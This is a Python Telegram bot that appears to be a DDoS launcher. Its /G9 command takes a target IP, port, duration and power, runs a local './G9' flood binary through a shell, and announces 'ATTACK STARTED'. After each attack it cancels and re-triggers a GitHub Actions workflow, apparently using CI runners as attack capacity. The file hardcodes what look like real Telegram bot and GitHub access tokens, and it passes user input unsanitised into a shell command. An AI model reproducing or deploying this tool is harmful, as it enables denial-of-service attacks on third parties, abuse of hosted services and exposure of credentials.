import telebot
import subprocess
import requests

# Insert your Telegram bot token here
bot = telebot.TeleBot('6472534758:AAGTOvmuiBnQSpQdmM2oNX_g1YJZtxLH8bA')

# GitHub data for workflows
github_data = [
    {
        "token": "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",
        "repo": "yespap589/SET_TP"
    },
    {
        "token": "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",
        "repo": "yespap589/SET_TP"
    }
]

# Function to stop the current workflow
def stop_current_workflow(repo, token, workflow_run_id):
    url = f"https://api.github.com/repos/{repo}/actions/runs/{workflow_run_id}/cancel"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.post(url, headers=headers)
    
    if response.status_code == 204:
        print(f"Successfully canceled the workflow for {repo}.")
    else:
        print(f"Failed to cancel the workflow for {repo}: {response.status_code} {response.text}")

# Function to trigger a new workflow
def trigger_workflow(repo, token):
    url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "ref": "main"  # Adjust if your default branch is different
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 201:
        print(f"Successfully triggered new workflow for {repo}.")
    else:
        print(f"Failed to trigger workflow for {repo}: {response.status_code} {response.text}")

# Handler for /G9 command
@bot.message_handler(commands=['G9'])
def handle_G9(message):
    command = message.text.split()
    if len(command) == 5:  # Accept target, port, and time
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])  # Convert time to integer
        power = int(command[4])  # Convert power to integer
        
        if time > 500:
            response = "Error: Time interval must be less than 501."
        else:
            start_attack_reply(message, target, port, time, power)  # Call start_attack_reply function
            full_command = f"./G9 {target} {port} {time} {power}"
            subprocess.run(full_command, shell=True)  # Run the command in the shell
            response = f"G9 Attack Finished. Target: {target} Port: {port} Time: {time} seconds."

            # Stop the current workflow and start a new one
            for data in github_data:
                # Assuming you have the workflow run ID of the current workflow
                workflow_run_id = 'CURRENT_WORKFLOW_RUN_ID'  # Replace with actual run ID if available
                stop_current_workflow(data['repo'], data['token'], workflow_run_id)
                trigger_workflow(data['repo'], data['token'])
    else:
        response = '''Usage: /G9 <target> <port> <time> <power>
Example: /G9 192.168.1.1 80 60 300
'''
    bot.reply_to(message, response)

# Function to handle the reply when users run the /G9 command
def start_attack_reply(message, target, port, time, power):
    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: G9\nBy G9"
    bot.reply_to(message, response)

# Command handler for /help
@bot.message_handler(commands=['help'])
def handle_help(message):
    response = '''Available commands:
    
/G9 <target> <port> <time> <power> - Start G9 attack
'''
    bot.reply_to(message, response)

# Start the bot
bot.polling()
